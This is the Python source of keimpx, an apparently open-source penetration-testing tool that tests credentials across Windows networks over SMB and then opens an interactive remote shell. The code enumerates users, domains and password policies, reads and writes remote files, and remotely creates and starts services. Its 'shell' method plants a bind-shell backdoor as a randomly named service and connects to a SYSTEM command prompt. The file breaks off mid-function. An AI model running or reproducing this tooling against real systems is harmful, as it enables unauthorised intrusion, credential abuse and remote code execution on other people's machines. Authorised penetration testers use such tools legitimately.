#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
# -*- Mode: python -*-

'''
$Id$

keimpx is an open source tool, released under a modified version of Apache
License 1.1. It is developed in Python using CORE Security Technologies's
Impacket library, http://code.google.com/p/impacket/.

It can be used to quickly check for the usefulness of credentials across a
network over SMB.

Homepage:                   http://code.google.com/p/keimpx/wiki/Homepage
Usage:                      http://code.google.com/p/keimpx/wiki/Usage
Examples:                   http://code.google.com/p/keimpx/wiki/Examples
Frequently Asked Questions: http://code.google.com/p/keimpx/wiki/FAQ
Contributors:               http://code.google.com/p/keimpx/wiki/Contributors

License:

I provide this software under a slightly modified version of the
Apache Software License. The only changes to the document were the
replacement of "Apache" with "keimpx" and "Apache Software Foundation"
with "Bernardo Damele A. G.". Feel free to compare the resulting document
to the official Apache license.

The `Apache Software License' is an Open Source Initiative Approved
License.

The Apache Software License, Version 1.1
Modifications by Bernardo Damele A. G. (see above)

Copyright (c) 2009-2012 Bernardo Damele A. G. <bernardo.damele@gmail.com>
All rights reserved.

This product includes software developed by CORE Security Technologies
(http://www.coresecurity.com/).

THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESSED OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED.  IN NO EVENT SHALL THE APACHE SOFTWARE FOUNDATION OR
ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF
USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
SUCH DAMAGE.
'''



__author__ = 'Bernardo Damele A. G. <bernardo.damele@gmail.com>'
__version__ = '0.3-dev'


import binascii
import logging
import os
import random
import re
import rlcompleter
import shlex
import socket
import string
import sys
import threading
import time
import warnings

from optparse import OptionError
from optparse import OptionGroup
from optparse import OptionParser
from subprocess import mswindows
from subprocess import PIPE
from subprocess import Popen
from subprocess import STDOUT
from telnetlib import Telnet
from threading import Thread

try:
    import psyco
    psyco.full()
    psyco.profile()
except ImportError, _:
    pass

try:
    from readline import *
    import readline as _rl

    have_readline = True
except ImportError:
    try:
        from pyreadline import *
        import pyreadline as _rl

        have_readline = True
    except ImportError:    
        have_readline = False

try:
    from impacket import smb
    from impacket import ImpactPacket
    from impacket.nmb import NetBIOSTimeout
    from impacket.dcerpc import dcerpc
    from impacket.dcerpc import transport
    from impacket.dcerpc import srvsvc
    from impacket.dcerpc import svcctl
    from impacket.dcerpc import winreg
    from impacket.dcerpc.samr import *
except ImportError:
    sys.stderr.write('You need to install Python Impacket library first\n')
    sys.exit(255)


added_credentials = set()
added_targets = set()
credentials = []
conf = {}
domains = []
pool_thread = None
successes = 0
targets = []
execute_commands = []
share = 'ADMIN$'
default_reg_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName'
logger = logging.getLogger('logger')
logger_handler = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', '%H:%M:%S')
logger_handler.setFormatter(formatter)
logger.addHandler(logger_handler)
logger.setLevel(logging.WARN)

if hasattr(sys, "frozen"):
    keimpx_path = os.path.dirname(unicode(sys.executable, sys.getfilesystemencoding()))
else:
    keimpx_path = os.path.dirname(os.path.realpath(__file__))


class credentialsError(Exception):
    pass


class domainError(Exception):
    pass


class targetError(Exception):
    pass


class threadError(Exception):
    pass


class missingService(Exception):
    pass


class missingShare(Exception):
    pass


class missingFile(Exception):
    pass

class registryKey(Exception):
    pass

class CompleterNG(rlcompleter.Completer):
    def global_matches(self, text):
        matches = []
        n = len(text)

        for ns in [ self.namespace ]:
            for word in ns:
                if word[:n] == text:
                    matches.append(word)

        return matches


def autoCompletion():
    global have_readline

    if not have_readline:
        return

    completer = CompleterNG({
                              'help':       None,
                              'verbosity':  None,
                              'info':       None,
                              'exit':       None,
                              'shares':     None,
                              'use':        None,
                              'cd':         None,
                              'pwd':        None,
                              'ls':         None,
                              'cat':        None,
                              'download':   None,
                              'upload':     None,
                              'mkdir':      None,
                              'rm':         None,
                              'rmdir':      None,
                              'services':   None,
                              'status':     None,
                              'start':      None,
                              'stop':       None,
                              'deploy':     None,
                              'undeploy':   None,
                              'shell':      None,
                              'users':      None,
                              'pswpolicy':  None,
                              'domains':    None,
                              'regread':    None,
                              'regwrite':   None,
                              'regdelete':  None
                            })

    _rl.set_completer(completer.complete)
    _rl.parse_and_bind('tab: complete')


########################################################################
# Code ripped with permission from deanx's polenum tool,               #
# http://labs.portcullis.co.uk/application/polenum/                    #
########################################################################

def get_obj(name):
    return eval(name)


def d2b(a):
    bin = []

    while a:
        bin.append(a%2)
        a /= 2

    return bin[::-1]


def display_time(filetime_high, filetime_low, minutes_utc=0):
    import __builtins__
    d = filetime_low + (filetime_high)*16**8 # convert to 64bit int
    d *= 1.0e-7 # convert to seconds
    d -= 11644473600 # remove 3389 years?

    try:
        return strftime('%a, %d %b %Y %H:%M:%S +0000ddddd', localtime(d)) # return the standard format day
    except ValueError, e:
        return '0'


class ExtendInplace(type):
    def __new__(self, name, bases, dict):
        prevclass = get_obj(name)
        del dict['__module__']
        del dict['__metaclass__']

        # We can't use prevclass.__dict__.update since __dict__
        # isn't a real dict
        for k, v in dict.iteritems():
            setattr(prevclass, k, v)

        return prevclass


def convert(low, high, no_zero):
    if low == 0 and hex(high) == '-0x80000000':
        return 'Not Set'
    if low == 0 and high == 0:
        return 'None'
    if no_zero: # make sure we have a +ve vale for the unsined int
        if (low != 0):
            high = 0 - (high+1)
        else:
            high = 0 - (high)
        low = 0 - low

    tmp = low + (high)*16**8 # convert to 64bit int
    tmp *= (1e-7) #  convert to seconds

    try:
        minutes = int(strftime('%M', gmtime(tmp)))  # do the conversion to human readable format
    except ValueError, e:
        return 'BAD TIME:'

    hours = int(strftime('%H', gmtime(tmp)))
    days = int(strftime('%j', gmtime(tmp)))-1
    time = ''

    if days > 1:
     time = str(days) + ' days '
    elif days == 1:
        time = str(days) + ' day '
    if hours > 1:
        time += str(hours) + ' hours '
    elif hours == 1:
        time = str(days) + ' hour '    
    if minutes > 1:
        time += str(minutes) + ' minutes'
    elif minutes == 1:
        time = str(days) + ' minute '

    return time


class MSRPCPassInfo:
    PASSCOMPLEX = {
                    5: 'Domain Password Complex',
                    4: 'Domain Password No Anon Change',
                    3: 'Domain Password No Clear Change',
                    2: 'Domain Password Lockout Admins',
                    1: 'Domain Password Store Cleartext',
                    0: 'Domain Refuse Password Change'
                  }


    def __init__(self, data = None):
        self._min_pass_length = 0
        self._pass_hist = 0
        self._pass_prop= 0
        self._min_age_low = 0
        self._min_age_high = 0
        self._max_age_low = 0
        self._max_age_high = 0
        self._pwd_can_change_low = 0
        self._pwd_can_change_high = 0
        self._pwd_must_change_low = 0
        self._pwd_must_change_high = 0
        self._max_force_low = 0
        self._max_force_high = 0
        self._role = 0
        self._lockout_window_low = 0
        self._lockout_window_high = 0
        self._lockout_dur_low = 0
        self._lockout_dur_high = 0
        self._lockout_thresh = 0

        if data:
            self.set_header(data, 1)


    def set_header(self,data,level):
        index = 8

        if level == 1: 
            self._min_pass_length, self._pass_hist, self._pass_prop, self._max_age_low, self._max_age_high, self._min_age_low, self._min_age_high = unpack('<HHLllll',data[index:index+24])
            bin = d2b(self._pass_prop)

            if len(bin) != 8:
                for x in xrange(6 - len(bin)):
                    bin.insert(0,0)

            self._pass_prop =  ''.join([str(g) for g in bin])    

        if level == 3:
            self._max_force_low, self._max_force_high = unpack('<ll',data[index:index+8])
        elif level == 7:
            self._role = unpack('<L',data[index:index+4])
        elif level == 12:
            self._lockout_dur_low, self._lockout_dur_high, self._lockout_window_low, self._lockout_window_high, self._lockout_thresh = unpack('<llllH',data[index:index+18])


    def print_friendly(self):
        print 'Minimum password length: %s' % str(self._min_pass_length or 'None')
        print 'Password history length: %s' % str(self._pass_hist or 'None' )
        print 'Maximum password age: %s' % str(convert(self._max_age_low, self._max_age_high, 1))
        print 'Password Complexity Flags: %s' % str(self._pass_prop or 'None')
        print 'Minimum password age: %s' % str(convert(self._min_age_low, self._min_age_high, 1))
        print 'Reset Account Lockout Counter: %s' % str(convert(self._lockout_window_low,self._lockout_window_high, 1)) 
        print 'Locked Account Duration: %s' % str(convert(self._lockout_dur_low,self._lockout_dur_high, 1)) 
        print 'Account Lockout Threshold: %s' % str(self._lockout_thresh or 'None')
        print 'Forced Log off Time: %s' % str(convert(self._max_force_low, self._max_force_high, 1))

        i = 0

        for a in self._pass_prop:
            print '%s: %s' % (self.PASSCOMPLEX[i], str(a))

            i+= 1

        return


class SAMREnumDomainsPass(ImpactPacket.Header):
    OP_NUM = 0x2E

    __SIZE = 22

    def __init__(self, aBuffer = None):
        ImpactPacket.Header.__init__(self, SAMREnumDomainsPass.__SIZE)

        if aBuffer:
            self.load_header(aBuffer)


    def get_context_handle(self):
        return self.get_bytes().tolist()[:20]


    def set_context_handle(self, handle):
        assert 20 == len(handle)
        self.get_bytes()[:20] = array.array('B', handle)


    def get_resume_handle(self):
        return self.get_long(20, '<')


    def set_resume_handle(self, handle):
        self.set_long(20, handle, '<')


    def get_account_control(self):
        return self.get_long(20, '<')


    def set_account_control(self, mask):
        self.set_long(20, mask, '<')


    def get_pref_max_size(self):
        return self.get_long(28, '<')


    def set_pref_max_size(self, size):
        self.set_long(28, size, '<')


    def get_header_size(self):
        return SAMREnumDomainsPass.__SIZE
    

    def get_level(self):
        return self.get_word(20, '<')


    def set_level(self, level):
        self.set_word(20, level, '<')


class SAMRRespLookupPassPolicy(ImpactPacket.Header):
    __SIZE = 4

    def __init__(self, aBuffer = None):
        ImpactPacket.Header.__init__(self, SAMRRespLookupPassPolicy.__SIZE)

        if aBuffer:
            self.load_header(aBuffer)


    def get_pass_info(self):
        return MSRPCPassInfo(self.get_bytes()[:-4].tostring())


    def set_pass_info(self, info, level):
        assert isinstance(info, MSRPCPassInfo)
        self.get_bytes()[:-4] = array.array('B', info.rawData())


    def get_return_code(self):
        return self.get_long(-4, '<')


    def set_return_code(self, code):
        self.set_long(-4, code, '<')


    def get_context_handle(self):
        return self.get_bytes().tolist()[:12]


    def get_header_size(self):
        var_size = len(self.get_bytes()) - SAMRRespLookupPassPolicy.__SIZE
        assert var_size > 0

        return SAMRRespLookupPassPolicy.__SIZE + var_size


class DCERPCSamr:
    __metaclass__ = ExtendInplace

    def enumpswpolicy(self,context_handle): # needs to make 3 requests to get all pass policy
        enumpas = SAMREnumDomainsPass()
        enumpas.set_context_handle(context_handle)
        enumpas.set_level(1)
        self._dcerpc.send(enumpas)
        data = self._dcerpc.recv()

        retVal = SAMRRespLookupPassPolicy(data)
        pspol = retVal.get_pass_info()
        enumpas = SAMREnumDomainsPass()
        enumpas.set_context_handle(context_handle)
        enumpas.set_level(3)
        self._dcerpc.send(enumpas)
        data = self._dcerpc.recv()
        pspol.set_header(data,3)

        enumpas = SAMREnumDomainsPass()
        enumpas.set_context_handle(context_handle)
        enumpas.set_level(7)
        self._dcerpc.send(enumpas)
        data = self._dcerpc.recv()
        pspol.set_header(data,7)

        enumpas = SAMREnumDomainsPass()
        enumpas.set_context_handle(context_handle)
        enumpas.set_level(12)
        self._dcerpc.send(enumpas)
        data = self._dcerpc.recv()
        pspol.set_header(data,12)

        return pspol 


    def opendomain(self, context_handle, domain_sid):
        opendom = SAMROpenDomainHeader()
        opendom.set_access_mask(0x305)
        opendom.set_context_handle(context_handle)
        opendom.set_domain_sid(domain_sid)
        self._dcerpc.send(opendom)
        data = self._dcerpc.recv()
        retVal = SAMRRespOpenDomainHeader(data)

        return retVal

########################################################################
# End of code ripped with permission from deanx's polenum tool,        #
# http://labs.portcullis.co.uk/application/polenum/                    #
########################################################################


class SMBShell:
    def __init__(self, target, credentials):
        '''
        Initialize the object variables
        '''

        self.__target = target
        self.__dstip = self.__target.getHost()
        self.__dstport = self.__target.getPort()

        self.__smb = None
        self.__user = credentials.getUser()
        self.__password = credentials.getPassword()
        self.__lmhash = credentials.getlmhash()
        self.__nthash = credentials.getnthash()
        self.__domain = credentials.getDomain()

        self.__dstname = '*SMBSERVER'
        self.__srcname = conf.name

        self.__timeout = 10

        self.tid = None
        self.pwd = ''
        self.share = None
        self.sharesList = []
        self.domainsDict = {}
        self.usersList = set()


    def __local_exec(self, cmd):
        '''
        Execute a local command if the provided command is preceed by an
        exclamation mark
        '''

        process = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
        stdout, _ = process.communicate()

        if stdout is not None:
            print stdout


    def __replace(self, value):
        return value.replace('/', '\\')


    def __check_share(self):
        if self.share is None or self.tid is None:
            raise missingShare, 'Share has not been specified'


    def eval(self, cmd=None):
        '''
        Evaluate the command provided via the command prompt
        '''

        if cmd is None:
            self.exit()

        elif cmd[0] == '!':
            self.__local_exec(cmd[1:])
            return

        l = []
        for arg in shlex.split(cmd):
            l.append(arg)
        cmd = l[0]

        try:
            f = SMBShell.__dict__[cmd]
            l[0] = self
            f(*l)

        except (missingShare, missingService, missingFile), e:
            logger.error(e)

        except registryKey, e:
            logger.error(e)
            sys.exit(1)

        except smb.SessionError, e:
            logger.error('SMB exception: %s' % str(e).split('code: ')[1])

        except smb.UnsupportedFeature, e:
            logger.error('SMB exception: %s. Retrying..' % str(e))

            time.sleep(1)
            self.eval(cmd)

        except Exception, e:
            if e is not None:
                logger.error('Exception: %s' % e)


    def interactive(self):
        logger.info('type \'help\' for help menu')

        i = raw_input('# ')

        while i:
            self.eval(i)

            i = raw_input('# ')


    def run(self, cmds=None):
        '''
        Create a new SMB session with the provided login details and
        show the command prompt
        '''

        self.connect()
        logger.debug('Connection to host %s established' % self.__target.getIdentity())
        self.login()
        logger.debug('Logged in as %s' % self.__user)

        if cmds is None or len(cmds) == 0:
            self.interactive()
        else:
            for cmd in cmds:
                self.eval(cmd)


    def help(self):
        '''
        Show the help menu
        '''

        print '''Generic options
===============
help - show this message
verbosity {level} - set verbosity level (0-2)
info - list system information
exit - terminates the SMB session and exit from the tool

Shares options
==============
shares - list available shares
use {sharename} - connect to an specific share
cd {path} - changes the current directory to {path}
pwd - shows current remote directory
ls {path} - lists all the files in the current directory
cat {file} - display content of the selected file
download {filename} - downloads the filename from the current path
upload {filename} - uploads the filename into the current path
mkdir {dirname} - creates the directory under the current path
rm {file} - removes the selected file
rmdir {dirname} - removes the directory under the current path

Services options
================
services [service name] - list services
status {service name} - query the status of a service
start {service name} - start a service
stop {service name} - stop a service
query {service name} - display the information of a service
deploy {service name} {local file} [service args] - deploy remotely a service executable
undeploy {service name} {remote file} - undeploy remotely a service executable

Shell options
=============
shell [port] - spawn a shell listening on a TCP port, by default 2090/tcp

Users options
=============
users [domain] - list users, optionally for a specific domain
pswpolicy [domain] - list password policy, optionally for a specific domain
domains - list domains to which the system is part of

Registry options (Soon)
================
regread {registry key} - read a registry key
regwrite {registry key} {registry value} - add a value to a registry key
regdelete {registry key} - delete a registry key
'''


    def verbosity(self, level):
        set_verbosity(level)


    def connect(self):
        '''
        Connect the SMB session
        '''

        self.__smb = smb.SMB(remote_name=self.__dstname, remote_host=self.__dstip, my_name=self.__srcname, sess_port=self.__dstport, timeout=self.__timeout)


    def login(self):
        '''
        Login over the SMB session
        '''

        try:
            self.__smb.login(self.__user, self.__password, self.__domain, self.__lmhash, self.__nthash)

        except socket.error, e:
            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e[1]))
            raise RuntimeError

        except smb.SessionError, e:
            logger.error('SMB exception: %s' % str(e).split('code: ')[1])
            raise RuntimeError


    def exit(self):
        '''
        Disconnect the SMB session
        '''

        self.__smb.logoff()
        sys.exit(0)


    def info(self):
        '''
        Display system information like operating system
        '''

        print 'Operating system: %s' % self.__smb.get_server_os()
        print 'Netbios name: %s' % self.__smb.get_server_name()
        print 'Domain: %s' % self.__smb.get_server_domain()
        print 'Time: %s' % self.__smb.get_server_time()


    def shares(self):
        '''
        List available shares and display a menu to select which share to
        connect to
        '''

        self.__shares_connect()

        count = 1

        for i in range(len(self.__resp)):
            name = self.__resp[i]['NetName'].decode('utf-16')
            comment = self.__resp[i]['Remark'].decode('utf-16')
            print '[%d] %s (comment: %s)' % (count, name, comment)

            self.sharesList.append(name)
            count += 1

        msg = 'Which share do you want to connect to? (default: 1) '
        limit = len(self.sharesList)
        choice = read_input(msg, limit)

        self.use(self.sharesList[choice-1])


    def use(self, sharename=None):
        '''
        Select the share to connect to
        '''

        if sharename is None:
            raise missingShare, 'Share has not been specified'

        self.share = sharename.strip("\x00")
        self.tid = self.__smb.tree_connect(self.share)
        self.pwd = ''


    def cd(self, path=None):
        '''
        Change the current path
        '''

        if path is None:
            self.pwd = ''
            return

        elif path == '.':
            return

        elif path == '..':
            sep = self.pwd.split('\\')
            self.pwd = '\\'.join(s for s in sep[:-1])

            return

        path = self.__replace(path)

        if path[0] == '\\':
           self.pwd = path

        else:
           self.pwd += '\\%s' % path


    def pwd(self):
        '''
        Display the current path
        '''

        print self.pwd


    def dir(self, path=None):
        '''
        Alias to ls
        '''

        self.ls(path)


    def ls(self, path=None):
        '''
        List files from the current/provided path
        '''

        self.__check_share()

        if path is None:
            pwd = '%s\\*' % self.pwd

        else:
            pwd = '%s\\%s\\*' % (self.pwd, self.__replace(path))

        for f in self.__smb.list_path(self.share, pwd):
            if f.is_directory() == 16:
                is_dir = '<DIR>'

            else:
                is_dir = '     '

            if f.get_filesize() == 0:
                filesize = '   '

            else:
                filesize = f.get_filesize()

            print '%s\t%s\t%s\t%s' % (time.ctime(float(f.get_mtime_epoch())), is_dir, filesize, f.get_longname())


    def cat(self, filename):
        '''
        Display a file content from the current path
        '''

        self.__check_share()

        filename = '%s\\%s' % (self.pwd, self.__replace(filename))
        self.fid = self.__smb.open(self.tid, filename, smb.SMB_O_OPEN, smb.SMB_ACCESS_READ)[0]

        offset = 0

        while 1:
            data = self.__smb.read(self.tid, self.fid, offset, 40000)

            print data

            if len(data) == 0:
                break

            offset += len(data)

        self.__smb.close(self.tid, self.fid)


    def get(self, filename):
        '''
        Alias to download
        '''

        self.download(filename)


    def download(self, filename):
        '''
        Download a file from the current path
        '''

        self.__check_share()

        fh = open(filename, 'wb')
        filename = '%s\\%s' % (self.pwd, self.__replace(filename))

        self.__smb.retr_file(self.share, filename, fh.write)
        fh.close()


    def put(self, filename, share=None, destfile=None):
        '''
        Alias to upload
        '''

        self.upload(filename, share=None, destfile=None)


    def upload(self, filename, share=None, destfile=None):
        '''
        Upload a file in the current path
        '''

        try:
            fp = open(filename, 'rb')
        except IOError:
            logger.error('Unable to open file \'%s\'' % filename)
            sys.exit(1)

        if share is None:
            self.__check_share()
            share = self.share

        if destfile is None:
            destfile = '%s\\%s' % (self.pwd, self.__replace(filename))

        self.__smb.stor_file(share, destfile, fp.read)
        fp.close()


    def mkdir(self, path):
        '''
        Create a directory in the current share
        '''

        self.__check_share()

        path = '%s\\%s' % (self.pwd, self.__replace(path))
        self.__smb.mkdir(self.share, path)


    def rm(self, filename, share=None):
        '''
        Remove a file in the current share
        '''

        filename = '%s\\%s' % (self.pwd, self.__replace(filename))

        if share is None:
            self.__check_share()
            share = self.share

        self.__smb.remove(share, filename)

 
    def rmdir(self, path):
        '''
        Remove a directory in the current share
        '''

        self.__check_share()

        path = '%s\\%s' % (self.pwd, self.__replace(path))
        self.__smb.rmdir(self.share, path)


    def start(self, srvname=None, srvargs=None):
        '''
        Start a service.
        '''

        if srvname is None:
            raise missingService, 'Service name has not been specified'

        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_start(srvname, srvargs)
        self.__svcctl_disconnect(srvname)


    def stop(self, srvname=None):
        '''
        Stop a service.
        '''

        if srvname is None:
            raise missingService, 'Service name has not been specified'

        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_stop(srvname)
        self.__svcctl_disconnect(srvname)


    def deploy(self, srvname=None, local_file=None, srvargs=None, remote_file=None):
        '''
        Deploy a Windows service: upload the service executable to the
        file system, create a service as 'Automatic' and start it
        '''

        if srvname is None:
            raise missingService, 'Service name has not been specified'

        if remote_file is None:
            remote_file = str(os.path.basename(local_file.replace('\\', '/')))

        self.__old_pwd = self.pwd
        self.pwd = ''

        self.__svcctl_bin_upload(local_file, remote_file)
        self.__svcctl_connect()
        self.__svcctl_create(srvname, remote_file)
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_start(srvname, srvargs)
        self.__svcctl_disconnect(srvname)

        self.pwd = self.__old_pwd


    def undeploy(self, srvname=None, remote_file=None):
        '''
        Wrapper method to undeploy a Windows service. It stops the
        services, removes it and removes the executable from the file
        system
        '''

        if srvname is None:
            raise missingService, 'Service name has not been specified'

        # TODO: extract executable name automatically
        remote_file = str(os.path.basename(remote_file.replace('\\', '/')))

        self.__old_pwd = self.pwd
        self.pwd = ''

        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_stop(srvname)
        self.__svcctl_delete(srvname)
        self.__svcctl_disconnect(srvname)
        self.__svcctl_bin_remove(remote_file)

        self.pwd = self.__old_pwd


    def services(self, srvname=None):
        self.__svcctl_connect()
        self.__svcctl_list(srvname)
        self.__svcctl_disconnect()


    def status(self, srvname):
        if srvname is None:
            raise missingService, 'Service name has not been specified'

        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_status(srvname)
        self.__svcctl_disconnect()


    def query(self, srvname):
        if srvname is None:
            raise missingService, 'Service name has not been specified'

        self.__svcctl_connect()
        self.__svcctl_srv_manager(srvname)
        self.__svcctl_info(srvname)
        self.__svcctl_disconnect()


    def shell(self, port=2090):
        '''
        Deploy a bindshell backdoor listening on a predefined TCP port for
        incoming connections then spawning a command prompt as SYSTEM.
        '''

        connected = False
        srvname = ''.join([random.choice(string.letters) for _ in xrange(0, 6)])
        local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in xrange(0, 6)])

        if not os.path.exists(local_file):
            raise missingFile, 'srv_bindshell.exe not found in the contrib subfolder'

        self.deploy(srvname, local_file, port, remote_file)

        logger.info('Connecting to backdoor on port %d, wait..' % int(port))

        for counter in range(0, 3):
            try:
                time.sleep(1)

                if str(sys.version.split()[0]) >= "2.6":
                    tn = Telnet(self.__dstip, int(port), 3)
                else:
                    tn = Telnet(self.__dstip, int(port))

                connected = True
                tn.interact()

            except (socket.error, socket.herror, socket.gaierror, socket.timeout), e:
                if connected is False:
                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (int(port), e[1])

                    if counter < 2:
                        warn_msg += ', retrying..'

                    logger.warn(warn_msg)

            except Exception, e:
                if e is not None:
                    logger.error('Exception: %s' % e)

            if connected is True:
                break

        time.sleep(1)
        self.undeploy(srvname, remote_file)


    def users(self, usrdomain=None):
        '''
        List users, optionally for a specific domain
        '''

        self.__samr_connect()
        self.__samr_users(usrdomain)
        self.__samr_disconnect()


    def pswpolicy(self, usrdomain=None):
        '''
        List password policy, optionally for a specific domain
        '''

        self.__samr_connect()
        self.__samr_pswpolicy(usrdomain)
        self.__samr_disconnect()


    def domains(self):
        '''
        List domains to which the system is part of
        '''

        self.__samr_connect()
        self.__samr_domains()
        self.__samr_disconnect()


    def regread(self, reg_key=None):
        '''
        Read a Windows registry key
        '''

        if reg_key is None:
            logger.warn('No registry hive provided, going to read \'%s\'' % default_reg_key)
            self.__winreg_key = default_reg_key
        else:
            self.__winreg_key = reg_key

        self.__winreg_connect()
        self.__winreg_open()
        self.__winreg_read()
        self.__winreg_disconnect()


    def regwrite(self, reg_key, reg_value):
        '''
        Write a value on a Windows registry key
        '''

        self.__winreg_key = reg_key
        self.__winreg_value = reg_value

        self.__winreg_connect()
        self.__winreg_open()
        self.__winreg_write()
        self.__winreg_disconnect()


    def regdelete(self, reg_key):
        '''
        Delete a Windows registry key
        '''

        self.__winreg_key = reg_key

        self.__winreg_connect()
        self.__winreg_open()
        self.__winreg_delete()
        self.__winreg_disconnect()


    def __smb_transport(self, named_pipe):
        '''
        Initiate a SMB connection on a specific named pipe
        '''

        self.trans = transport.SMBTransport(dstip=self.__dstip, dstport=self.__dstport, filename=named_pipe)
        self.trans.set_credentials(username=self.__user, password=self.__password, domain=self.__domain, lmhash=self.__lmhash, nthash=self.__nthash)

        try:
            self.trans.connect()

        except socket.error, e:
            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e[1]))
            raise RuntimeError

        except smb.SessionError, e:
            logger.warn('SMB exception: %s' % str(e).split('code: ')[1])
            raise RuntimeError


    def __shares_connect(self):
        '''
        Connect to the srvsvc named pipe
        '''

        logger.info('Connecting to the SRVSVC named pipe')

        self.__smb_transport('srvsvc')

        logger.debug('Binding on Server Service (SRVSVC) interface')
        self.__dce = dcerpc.DCERPC_v5(self.trans)
        self.__dce.bind(srvsvc.MSRPC_UUID_SRVSVC)
        self.__svc = srvsvc.DCERPCSrvSvc(self.__dce)
        self.__resp = self.__svc.get_share_enum_1(self.trans.get_dip())


    def __svcctl_srv_manager(self, srvname):
        self.__resp = self.__svc.OpenServiceW(self.__mgr_handle, srvname.encode('utf-16le'))
        self.__svc_handle = self.__resp['ContextHandle']


    def __svcctl_connect(self):
        '''
        Connect to svcctl named pipe
        '''

        logger.info('Connecting to the SVCCTL named pipe')

        self.__smb_transport('svcctl')

        logger.debug('Binding on Services Control Manager (SCM) interface')
        self.__dce = dcerpc.DCERPC_v5(self.trans)
        self.__dce.bind(svcctl.MSRPC_UUID_SVCCTL)
        self.__svc = svcctl.DCERPCSvcCtl(self.__dce)
        self.__resp = self.__svc.OpenSCManagerW()
        self.__mgr_handle = self.__resp['ContextHandle']


    def __svcctl_disconnect(self, srvname=None):
        '''
        Disconnect from svcctl named pipe
        '''

        logger.debug('Disconneting from the SVCCTL named pipe')

        if srvname is not None:
            self.__svc.CloseServiceHandle(self.__svc_handle)

        if self.__mgr_handle:
            self.__svc.CloseServiceHandle(self.__mgr_handle)

        self.__dce.disconnect()


    def __svcctl_bin_upload(self, local_file, remote_file):
        '''
        Upload the service executable
        '''

        global share

        logger.info('Uploading the service executable to \'%s\\%s\'' % (share, remote_file))

        self.upload(local_file, share, remote_file)


    def __svcctl_bin_remove(self, remote_file):
        '''
        Remove the service executable
        '''

        global share

        logger.info('Removing the service executable \'%s\\%s\'' % (share, remote_file))

        self.rm(remote_file, share)


    def __svcctl_create(self, srvname, remote_file):
        '''
        Create the service
        '''

        logger.info('Creating the service \'%s\'' % srvname)

        self.__pathname = '%%SystemRoot%%\\%s' % remote_file
        self.__pathname = self.__pathname.encode('utf-16le')

        self.__svc.CreateServiceW(self.__mgr_handle, srvname.encode('utf-16le'), srvname.encode('utf-16le'), self.__pathname)


    def __svcctl_delete(self, srvname):
        '''
        Delete the service
        '''

        logger.info('Deleting the service \'%s\'' % srvname)

        self.__svc.DeleteService(self.__svc_handle)


    def __svcctl_parse_info(self, resp):
        print "TYPE              : %2d - " % resp['QueryConfig']['ServiceType'],

        if resp['QueryConfig']['ServiceType'] == 0x1:
            print "SERVICE_KERNLE_DRIVER"
        elif resp['QueryConfig']['ServiceType'] == 0x2:
            print "SERVICE_FILE_SYSTEM_DRIVER"
        elif resp['QueryConfig']['ServiceType'] == 0x10:
            print "SERVICE_WIN32_OWN_PROCESS"
        elif resp['QueryConfig']['ServiceType'] == 0x20:
            print "SERVICE_WIN32_SHARE_PROCESS"
        else:
            print "UNKOWN"

        print "START_TYPE        : %2d - " % resp['QueryConfig']['StartType'],

        if resp['QueryConfig']['StartType'] == 0x0:
            print "BOOT START"
        elif resp['QueryConfig']['StartType'] == 0x1:
            print "SYSTEM START"
        elif resp['QueryConfig']['StartType'] == 0x2:
            print "AUTO START"
        elif resp['QueryConfig']['StartType'] == 0x3:
            print "DEMAND START"
        elif resp['QueryConfig']['StartType'] == 0x4:
            print "DISABLED"
        else:
            print "UNKOWN"

        print "ERROR_CONTROL     : %2d - " % resp['QueryConfig']['ErrorControl'],

        if resp['QueryConfig']['ErrorControl'] == 0x0:
            print "IGNORE"
        elif resp['QueryConfig']['ErrorControl'] == 0x1:
            print "NORMAL"
        elif resp['QueryConfig']['ErrorControl'] == 0x2:
            print "SEVERE"
        elif resp['QueryConfig']['ErrorControl'] == 0x3:
            print "CRITICAL"
        else:
            print "UNKOWN"

        print "BINARY_PATH_NAME  : %s" % resp['QueryConfig']['BinaryPathName'].decode('utf-16le')
        print "LOAD_ORDER_GROUP  : %s" % resp['QueryConfig']['LoadOrderGroup'].decode('utf-16le')
        print "TAG               : %d" % resp['QueryConfig']['TagID']
        print "DISPLAY_NAME      : %s" % resp['QueryConfig']['DisplayName'].decode('utf-16le')
        print "DEPENDENCIES      : %s" % resp['QueryConfig']['Dependencies'].decode('utf-16le').replace('/',' - ')
        print "SERVICE_START_NAME: %s" % resp['QueryConfig']['ServiceStartName'].decode('utf-16le')


    def __svcctl_parse_status(self, status):
        if status == svcctl.SERVICE_CONTINUE_PENDING:
           return "CONTINUE PENDING"
        elif status == svcctl.SERVICE_PAUSE_PENDING:
           return "PAUSE PENDING"
        elif status == svcctl.SERVICE_PAUSED:
           return "PAUSED"
        elif status == svcctl.SERVICE_RUNNING:
